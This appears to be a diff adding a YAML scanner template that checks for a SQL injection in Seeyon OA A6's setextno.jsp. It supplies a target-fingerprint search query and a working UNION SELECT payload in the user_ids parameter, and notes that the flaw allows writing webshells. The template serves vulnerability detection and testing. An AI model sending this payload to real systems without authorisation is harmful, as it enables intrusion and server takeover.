@@ -1,0 +1,18 @@
+name: Seeyon OA A6 setextno.jsp SQL injection
+manual: true
+query: app="Yonyou-Seeyon-OA" && body="致远协创A6"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=%2899999%29%20union%20all%20select%201,2,%28md5%281%29%29,4
+    expression: response.status == 200 && response.body.bcontains(b"c4ca4238a0b923820dcc509a6f75849b")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: Seeyon OA A6 setextno.jsp There is a SQL injection vulnerability, and
+    the server can be controlled by injecting and writing webshell files
+  tags: SQL Injection
